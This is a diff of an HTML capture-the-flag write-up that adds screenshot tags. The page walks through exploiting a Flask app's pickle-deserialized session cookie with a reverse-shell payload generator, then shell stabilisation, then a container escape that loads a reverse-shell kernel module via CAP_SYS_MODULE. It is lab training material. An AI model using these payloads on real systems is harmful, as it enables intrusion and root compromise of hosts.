@@ -502,8 +502,14 @@ valid_lft forever preferred_lft forever</div>
                     </tbody>
                 </table>
 
-                <p>The interesting discovery it was it<br>192.168.100.12:5000<br>Werkzeug/3.1.3<br><br>Python/3.10.12<br>now we need discover it<br><code>curl -i http://192.168.100.12:5000/</code><br>it make us to know this port is<br>Flask login panel<br>accept post method on / path<br>the unexpected thing heppened that it was the website doesnt validate the credentials<br>The Flask application was only accessible from the internal network so I decided to use SSH local port forwarding to access it from my machine and inspect the requests through Burp Suite<br>i made it and login with test test<br><br>then i think we need to show the req<br>we found it<br><code>session_data=80049525000000000000007d94288c0475736572948c0474657374948c077
-					26576656e7565948c05383530303094752e</code><br>ummm i think i will try to use Ai to analysis it<br><br>Thats interesting<br>If we can prove that the application uses pickle.loads() to deserialize this cookie, I think we can potentially get RCE.<br>Now we prove it<br><br>then i use this script to generate a payload for reverse shell</p>
+                <p>The interesting discovery it was it<br>192.168.100.12:5000<br>Werkzeug/3.1.3<br><br>Python/3.10.12<br>now we need discover it<br><code>curl -i http://192.168.100.12:5000/</code><br>it make us to know this port is<br>Flask login panel<br>accept post method on / path<br>the unexpected thing heppened that it was the website doesnt validate the credentials<br>The Flask application was only accessible from the internal network so I decided to use SSH local port forwarding to access it from my machine and inspect the requests through Burp Suite<br>i made it and login with test test<br><div class="img-container">
+                    <img src="images/voyage9" alt="Proof of Concept Image 3">
+                </div><br>then i think we need to show the req<br>we found it<br><code>session_data=80049525000000000000007d94288c0475736572948c0474657374948c077
+					26576656e7565948c05383530303094752e</code><br>ummm i think i will try to use Ai to analysis it<br><div class="img-container">
+                    <img src="images/voyage10" alt="Proof of Concept Image 3">
+                </div><br>Thats interesting<br>If we can prove that the application uses pickle.loads() to deserialize this cookie, I think we can potentially get RCE.<br>Now we prove it<br><div class="img-container">
+                    <img src="images/voyage11" alt="Proof of Concept Image 3">
+                </div><br>then i use this script to generate a payload for reverse shell</p>
 
                 <div class="code-box">import pickle
 import os
@@ -516,14 +522,20 @@ class exploit(object):
 if __name__ == '__main__':
     print(binascii.hexlify(pickle.dumps(exploit())))</div>
 
-                <p>This generate a new cookie that have the payload inside<br>and i open shell to receive it<br><br>that give me another shell But it put me in another Contain Docker<br><br>I set up the connection like this</p>
+                <p>This generate a new cookie that have the payload inside<br>and i open shell to receive it<br><div class="img-container">
+                    <img src="images/voyage12" alt="Proof of Concept Image 3">
+                </div><br>that give me another shell But it put me in another Contain Docker<br><div class="img-container">
+                    <img src="images/voyage13" alt="Proof of Concept Image 3">
+                </div><br>I set up the connection like this</p>
 
                 <div class="terminal-box">script /dev/null -c bash
 stty raw -echo; fg
 reset
 xterm</div>
 
-                <p>TTY / shell stabilization<br>Then i find the First Flag</p>
+                <p>TTY / shell stabilization<br>Then i find the First Flag</p><div class="img-container">
+                    <img src="images/voyage4" alt="Proof of Concept Image 3">
+                </div>
 
                 <h2>3. Container Escape & Privilege Escalation ⚡</h2>
                 <p>Now we need to perform privilege escalation<br>Then I transferred LinPEAS to the container and executed it to enumerate potential privilege escalation<br>LinPEAS identified container/kernel-related security weaknesses including the presence of the host-relevant /proc interface and the CAP_SYS_MODULE capability.<br>The second important finding was that the container had the CAP_SYS_MODULE capability enabled.<br>This capability allowed us to load a kernel module into the running kernel<br>Now we need to do container escapescape<br>I used a reverse shell kernel module template from HackTricks and modified it to point to my attack machine</p>
@@ -560,11 +572,15 @@ all:
 clean:
 	make -C $(KDIR) M=$(PWD) clean</div>
 
-                <p><code>make</code><br>now we have output rev.ko<br>I set up another listener on my machine and loaded the module.</p>
+                <p><code>make</code><br>now we have output rev.ko<br>I set up another listener on my machine and loaded the module.</p><div class="img-container">
+                    <img src="images/voyage16" alt="Proof of Concept Image 3">
+                </div>
 
                 <div class="conclusion-box">
                     <p style="margin: 0; color: var(--accent-green); font-weight: bold; font-family: var(--font-code);">Root Access Granted 🔥</p>
                     <p style="margin-top: 10px; color: #cbd5e1;">Now the module executed immediately giving me a reverse shell on the host machine.<br>Now I had successfully escaped the container and obtained root access</p>
+                </div><div class="img-container">
+                    <img src="images/voyage17" alt="Proof of Concept Image 3">
                 </div>
 
                 <p style="margin-top: 30px; font-weight: bold; font-family: var(--font-code); color: var(--accent-green);">Bye 👋</p>
